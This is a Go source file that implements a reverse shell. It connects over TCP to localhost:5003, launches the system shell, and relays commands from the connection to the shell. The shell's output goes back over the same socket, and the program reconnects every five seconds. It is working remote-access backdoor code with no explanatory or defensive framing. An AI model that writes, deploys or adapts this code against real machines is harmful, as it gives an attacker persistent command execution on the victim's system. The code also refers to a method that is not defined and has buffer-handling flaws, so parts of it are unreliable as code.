package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"time"
)

func exists(path string) bool {
	_, err := os.Stat(path)
	if err == nil {
		return true
	}
	if os.IsNotExist(err) {
		return false
	}
	return true
}

func NewShell(conn net.Conn) Shell {
	s := Shell{
		conn:      conn,
		stdinBuf:  make([]byte, 128),
		stdoutBuf: make([]byte, 128),
	}

	s.cmd = exec.Command(s.getSystemShellPath())
	s.stdin, _ = s.cmd.StdinPipe()
	s.stdout, _ = s.cmd.StdoutPipe()
	s.stderr, _ = s.cmd.StderrPipe()

	return s
}

type Shell struct {
	conn net.Conn

	cmd    *exec.Cmd
	stdin  io.WriteCloser
	stdout io.ReadCloser
	stderr io.ReadCloser

	lastStdinRecv int
	stdinBuf      []byte
	stdoutBuf     []byte
}

func (s *Shell) stdinPipe() {
	for {
		n, err := s.conn.Read(s.stdinBuf[0:])
		if err != nil {
			fmt.Println("stdinPipe close:", err)
			break
		}

		s.lastStdinRecv = n
		s.stdin.Write(s.stdinBuf[0:n])
	}
}

func (s *Shell) stdoutPipe() {
	for {
		n, _ := s.stdout.Read(s.stdoutBuf[0:])

		// TODO: Clean this up
		// Skip next s.lastStdinRecv bytes, these are the command that was sent
		if s.lastStdinRecv > 0 {
			if n < s.lastStdinRecv {
				s.lastStdinRecv -= n

				// Nothing left...
				continue
			} else {
				s.stdoutBuf = s.stdoutBuf[s.lastStdinRecv:]

				// There might still be some left, remove extra bytes
				n -= s.lastStdinRecv
				s.lastStdinRecv = 0
			}
		}

		s.conn.Write(s.stdoutBuf[0:n])
	}
}

func (s *Shell) Start() {
	go s.stdinPipe()

	s.cmd.Start()
	s.stdoutPipe()
}

func main() {
	for {
		conn, err := net.Dial("tcp", "localhost:5003")
		if err != nil {
			fmt.Println("Failed connecting: ", err)
		} else {
			shell := NewShell(conn)

			shell.Start()
		}

		fmt.Println("Reconnecting in 5 seconds")
		time.Sleep(5 * time.Second)
	}
}
